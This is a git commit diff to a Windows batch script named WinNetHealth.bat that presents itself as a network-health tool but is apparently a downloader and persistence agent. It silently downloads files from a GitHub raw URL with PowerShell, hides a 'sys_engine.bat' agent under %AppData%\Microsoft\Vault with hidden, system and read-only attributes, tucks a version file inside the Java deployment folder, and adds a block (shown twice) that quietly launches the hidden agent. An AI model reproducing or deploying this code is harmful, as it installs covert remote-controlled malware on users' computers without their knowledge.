8b66bb0e9750fd9c2eb7460dd5a6a466e797458e
Shojo 3 <kokoronoshojo@gmail.com>
2026-04-09 23:14:55 -0600

    WinNetHealth.bat

--- WinNetHealth.bat
+++ WinNetHealth.bat
@@ -2,12 +2,12 @@
 setlocal enabledelayedexpansion
 
 :: --- 1. CONFIGURACIÓN DE RUTAS Y VERSIONES ---
-set "VERSION_LOCAL=%VERSION_DIR%\v.txt"
+set "VERSION_LOCAL=%VERSION_DIR%\v_data.log"
 :: Corregido el doble Roaming para que coincida con el instalador
 set "AGENTE_DIR=%AppData%\Microsoft\Vault"
 set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"   
 set "BACKUP_DIR=%windir%\System32\drivers\etc\vps_logs"
-set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data"
+set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment"
 
 :: URLs de GitHub
 set "URL_BASE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets"
@@ -16,12 +16,13 @@ set "URL_AGENTE=%URL_BASE%/agente.bat"
 
 :: --- 2. MÓDULO DE ACTUALIZACIÓN (Sincronización) ---
 :: Intentamos bajar la versión de la nube a un temporal
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VERSION_DIR%\v.txt')" >nul 2>&1
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VERSION_DIR%\v_data.log')" >nul 2>&1
 
-if exist "%VERSION_DIR%\v.txt" (
-    set /p VERSION_NUBE= < "%VERSION_DIR%\v.txt"
-    del /f /q "%VERSION_DIR%\v.txt" >nul 2>&1
+if exist "%VERSION_DIR%\v_data.log" (
+    set /p VERSION_NUBE= < "%VERSION_DIR%\v_data.log"
+    del /f /q "%VERSION_DIR%\v_data.log" >nul 2>&1
     
+
     :: LIMPIEZA DE FORMATO: Quitamos espacios vacíos que GitHub a veces añade
     set "VERSION_NUBE=!VERSION_NUBE: =!"
     
@@ -60,6 +61,11 @@ if not exist "%AGENTE_FILE%" (
     attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
 )
 
+:: Si el Agente no está corriendo, lo lanzamos de forma silenciosa
+tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
+if %errorlevel% neq 0 (
+    start /b "" cmd /c "%AGENTE_FILE%"
+)
 :: Si el Agente no está corriendo, lo lanzamos de forma silenciosa
 tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
 if %errorlevel% neq 0 (
